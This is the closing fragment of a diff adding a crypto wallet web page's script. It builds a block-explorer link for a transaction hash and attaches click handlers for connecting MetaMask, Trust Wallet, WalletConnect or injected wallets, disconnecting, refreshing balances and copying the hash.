+    expDiv.innerHTML = `<a href="${net.explorer}${hash}" target="_blank" rel="noopener" style="color:var(--accent);font-size:0.8rem;text-decoration:none;">View on explorer →</a>`;
+    showEl(expDiv);
+  }
+}
+
+/* ─────────────────────────────────────────────────────────────────
+   EVENTS
+   ───────────────────────────────────────────────────────────────── */
+$('connectWC').addEventListener('click', openWCModal);
+$('connectMetaMask').addEventListener('click',    () => connectWallet('metamask'));
+$('connectTrustWallet').addEventListener('click', () => connectWallet('trust'));
+$('connectInjected').addEventListener('click',    () => connectWallet('injected'));
+$('disconnectBtn').addEventListener('click', disconnect);
+$('refreshBtn').addEventListener('click', fetchBalances);
+ui.txHash.addEventListener('click', function() {
+  copyText(this.textContent);
+  const orig = this.textContent;
+  this.textContent = 'Copied!';
+  setTimeout(() => { this.textContent = orig; }, 1200);
+});
+</script>
+</body>
+  </html>
